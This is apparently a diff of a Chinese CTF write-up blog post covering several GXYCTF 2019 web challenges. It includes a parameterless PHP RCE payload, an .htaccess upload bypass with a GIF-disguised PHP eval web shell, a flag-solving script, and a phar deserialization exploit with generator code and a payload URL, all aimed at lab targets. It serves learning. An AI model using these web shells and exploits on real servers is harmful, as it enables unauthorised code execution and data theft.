-<p><img src="https://img-blog.csdnimg.cn/20200912200627568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><blockquote>
-<p>知识点：无参RCE，一些函数的绕过，RCE的骚姿势-session</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200912203437269.png#pic_center" alt="在这里插入图片描述"><br>源码没有东西，bp抓包也看不到啥，上扫描（赵总靶机有频率限制，所以加上了延时0.06S）！存在git泄露哦，嘿嘿嘿<br><img src="https://img-blog.csdnimg.cn/20200912204932579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200912210152363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>啊这常用的为协议都被ban掉了啊，也是个RCE的题，参考大佬的博客吧。。。</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://yanmymickey.github.io/2020/03/16/CTF/%5BGXYCTF2019%5D%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83%20WP/">博客一</a> ，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12311239.html">博客二</a> ，<a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">博客三</a>，<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/530.html?replytocom=5">Y1ng</a><br>配合食用效果更佳，大佬们tql<br><img src="https://img-blog.csdnimg.cn/20200912213003314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="引自：Y#MD%00"></p>
-</blockquote>
-<p>这题是无参RCE，无参RCE的意思是只允许执行a(), a(b())这样的函数，而不允许带参数，比如a(“b”)是禁止的.<br>想读flag，那也带先知道文件名和文件路径噻，怎么读呢，用<code>scandir()</code>函数可以列出目录下文件，如<code>&lt;?php print_r(scandir(&#39;.&#39;))?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200912212854576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>但是我们函数里面有个<code>‘.’</code>，怎么搞? <code>localeconv() </code>函数返回一包含本地数字及货币格式信息的数组，有点看不懂，试一试，注意第一个参数，是个点！再加上<code>current（）</code>函数(或者poc())，此函数返回数组中的当前元素的值，默认是第一个鸭，因为数组指针没动</p>
-<blockquote>
-<p>相关函数：<br>end() - 将内部指针指向数组中的最后一个元素，并输出。<br>next() - 将内部指针指向数组中的下一个元素，并输出。<br>prev() - 将内部指针指向数组中的上一个元素，并输出。<br>reset() - 将内部指针指向数组中的第一个元素，并输出。<br>each() - 返回当前元素的键名和键值，并将内部指针向前移动。</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200912213802160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200913114407999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这样就可以读取题目下都有啥文件啦，其实字典已经扫出来flag.php了，然后就是怎么读取的问题了<br><img src="https://img-blog.csdnimg.cn/20200913115323573.png#pic_center" alt="在这里插入图片描述"><br>上面介绍current()函数的时候介绍的相关函数就有用啦，但是用next()的话是第二个，用end()是最后一个，读不到倒数第二个的值，这时候就需要<code>array_reverse()</code>函数了，这是可以以相反的顺序返回数组，然后再用<code>next()</code>函数读取第二个值，试一试，读出来了<br><img src="https://img-blog.csdnimg.cn/20200913131423592.png#pic_center" alt="在这里插入图片描述"><br>怎么读内容呢？看源码发现<code>et</code>被ban掉了，那<code>ile_get_contents()</code>就用不了了，<br>不过可以用<code>readfile()</code>、<code>show_source()</code>、<code>highlight_file()</code>这三个函数替代，所以最终的payload就是<br><code>?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br><img src="https://img-blog.csdnimg.cn/20200913223422570.png#pic_center" alt="在这里插入图片描述"></p>
-<ul>
-<li><strong>骚姿势</strong><br>sky师傅的一种思路<br>php默认是不主动使用session的，但是我们可以用通过<code>session_start()</code>告诉PHP使用session，session_id()可以获取到当前的session id，再手动设置cookie，如下，然后再读取内容就好了<br><img src="https://img-blog.csdnimg.cn/20200913231557487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200913231945391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
-</ul>
-<hr>
-<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><blockquote>
-<p>知识点：.htaccess的妙用</p>
-</blockquote>
-<p>先上传一个小马看看，==ph== 后缀的都被ban了。。。<br><img src="https://img-blog.csdnimg.cn/20200916142612185.png#pic_center" alt="在这里插入图片描述"><br>图片马试一试，凉凉，看看是什么服务，搞一个不存在的页面让它404<br><img src="https://img-blog.csdnimg.cn/20200916142737953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916143102378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>apache的，那就用 ==.htaccess==让apache将所有上传的文件都当成php来执行，代码如下，上传记得用bp改文件类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>何为.htaccess？<br>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200916143512494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后在传一个图片马就行，额一句话的🐎不行，应该是过滤了<code>&lt;?</code>，那就用js引用，代码如下</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">&#x27;xxx&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200916143631619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144038324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144147992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<ul>
-<li><p>AntSword连一下就好<br><img src="https://img-blog.csdnimg.cn/20200916144249764.png#pic_center" alt="在这里插入图片描述"></p>
-</li>
-<li><p>不想用AntSword可以post<code>xxx=system(&#39;cat /flag&#39;)</code>，不过函数被ban了，但是还能用上题用的<code>show_source()</code><br><img src="https://img-blog.csdnimg.cn/20200916144556253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144803665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144920251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-</li>
-</ul>
-<hr>
-<h1 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h1><blockquote>
-<p>知识点：脚本练习，python，re</p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/20200916145929588.png#pic_center" alt="在这里插入图片描述"><br>还真是莫的感情啊，python脚本计算<br><a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-reg-expressions.html">re教程</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://795c13f3-e110-4612-a26d-92f4d73b5398.node3.buuoj.cn&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">exp = re.compile(<span class="string">r&#x27;[0-9]+ [+|-] [0-9]+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = s.get(url)</span><br><span class="line">res.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;answer&quot;</span>:eval(exp.findall(res.text)[<span class="number">0</span>])&#125;//eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">res = s.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.06</span>)//靶机限制，延时</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    answer = eval(exp.findall(res.text)[<span class="number">0</span>])</span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span>:answer&#125;</span><br><span class="line">    res = s.post(url,data)</span><br><span class="line">    res.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;&#123;0&#125;次提交：&#123;1&#125;&#x27;</span>.format(i,answer))</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20200916154646548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<hr>
-<h1 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h1><blockquote>
-<p>知识点：弱口令，LFI，phar反序列化<br>官方WP：<a target="_blank" rel="noopener" href="https://gksec.com/GXY_CTF_WriteUp.html">https://gksec.com/GXY_CTF_WriteUp.html</a></p>
-</blockquote>
-<p>题目是sql，开始页面也是登录框，看源码有个u9db8，搜了一下也没看懂， 开始注入，各种方法都没用，看了看wp发现这根本不是sql。。。是个爆破界面，和上面那个注入一样，用户名是admin，爆破密码，注意设置线程，赵总靶机有访问限制，出密码了，登上看看<br><img src="https://img-blog.csdnimg.cn/20200916195944398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916200133402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>登上是个上传，但是URL感觉会有LFI，搞一下搞一下<br><img src="https://img-blog.csdnimg.cn/20200916200702578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		$ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>file_get_contents($uploader)</code>这行代码可以把我们上传的文件读出来，所以我们只需要将 ==$this-&gt;Filename== 等于flag.php就可以读出来flag（提一下，不晓得为啥只出来这一次，我在上传读取就变成了flag.php+文件内容，还望各位师傅指点迷津）<br> <img src="https://img-blog.csdnimg.cn/20200921161839314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
-<li>官方做法：<br> 扫了一下，存在flag.php，访问一下被ban了<br> <img src="https://img-blog.csdnimg.cn/20200921174822895.png#pic_center" alt="在这里插入图片描述"><br>看upload源码发现析构函数里面有==eval== 函数，要想利用这个函数就需要<code>$this-&gt;token != $_SESSION[&#39;user&#39;]</code>，在构造函数里面可以看到正确上传文件后，文件名就是==SESSION== ，上传一个看看吧<br><img src="https://img-blog.csdnimg.cn/2020092117591464.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200921180312695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200921180450793.png#pic_center" alt="在这里插入图片描述"><br>但是，怎么利用呢？并没有cmd参数可以上传，所以，我也不晓得哈哈哈。<br>官方说的是用反序列化，但是本题并没有 <code>unserialize() </code><blockquote>
-<p>怎么反序列化？<br>引用官方：PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，既然是打包文件，就肯定 会对相应的class进行序列化存储，再在执行某些函数或者需要调用数据的时候自动反序列化，很 多函数都可以自动反序列化phar文件，常见的莫过于 file_get_contents() 和 file_put_contents() ，具体哪些函数受影响请参考 <a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">seaii 师傅的博客</a><br>\</p>
-<ul>
-<li>此外，phar还有一个特点，无需特定的文件后缀，即使使用txt格式的后缀只要文件内容是phar的 格式即可被php识别为phar文件，可以利用这个feature上传txt文件构造反序列化</li>
-<li>现在只要构造一个phar反序列化文件，将命令替换为getﬂag操作，再把 检查的token替换为服务器分发的，后控制文件名进行反序列化操作，达到任意命令执行的目 的</li>
-</ul>
-</blockquote>
-</li>
-</ul>
-<p>在本地生成一个phar文件，注意：创建phar文件需要先将==php.ini== 中的==Phar.readonly== 设置为off，并去掉注释符号<br><img src="https://img-blog.csdnimg.cn/20200921191259160.png#pic_center" alt="在这里插入图片描述"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $Filename;</span><br><span class="line">		<span class="keyword">public</span> $cmd;</span><br><span class="line">		<span class="keyword">public</span> $token;</span><br><span class="line">	&#125;</span><br><span class="line">	$o = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$o-&gt;cmd = <span class="string">&#x27;show_source(&quot;./flag.php&quot;);&#x27;</span>;</span><br><span class="line">	$o-&gt;Filename = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	$o-&gt;token = <span class="string">&#x27;GXY2deee2b530c9eab1ca630b4bb846d949&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span>(serialize($o));</span><br><span class="line"></span><br><span class="line">	$exp = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">	$exp-&gt;startBuffering();</span><br><span class="line">	$exp-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __halt_compiler();?&gt;&quot;</span>);<span class="comment">//设置stub，并增加gif头</span></span><br><span class="line">	$exp-&gt;setMetadata($o);<span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">	$exp-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">	$exp-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>将生成的phar文件上传得到路径，将此路径作为==name== 参数，并带上<code>phar://</code>，这样 ==$this-&gt;Filename== 就被指定为phar，触发phar反序列化，导致命令执行<br><img src="https://img-blog.csdnimg.cn/20200921193511987.png#pic_center" alt="在这里插入图片描述"><br>最后payload<br><code>http://e056dfaa-4f83-4709-9d5b-8fcf86ecd67f.node3.buuoj.cn/upload.php?name=phar:///var/www/html/uploads/8d9d1997da800fb74165a46e7f667312/GXY2deee2b530c9eab1ca630b4bb846d949.txt</code><br>再随意上传一个文件即可看到flag，额可惜复现失败，我也不晓得咋回事<br><img src="https://img-blog.csdnimg.cn/2020092119551646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/490.htm">Y1ng师傅</a>的getshell<br>upload的源码里面的正则，因为出题人为了代码美观，再<code>.</code>前面多了一个空格，所以正则匹配变成了匹配<code>%20.</code>，也就是没匹配。。。<br><img src="https://img-blog.csdnimg.cn/20200921195749702.png#pic_center" alt="在这里插入图片描述"><br>这个可以自行尝试，Y1ng师傅讲的也很清楚，不再赘述</li>
-</ul>
-<hr>
-<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1><p>对于我这个菜鸡，这次的全家桶让我学到不少东西，继续淦</p>
+<!-- TOC -->
 
+<ul>
+<li><a href="#ping-ping-ping">Ping Ping Ping</a></li>
+<li><a href="#babysqli">BabySQli</a></li>
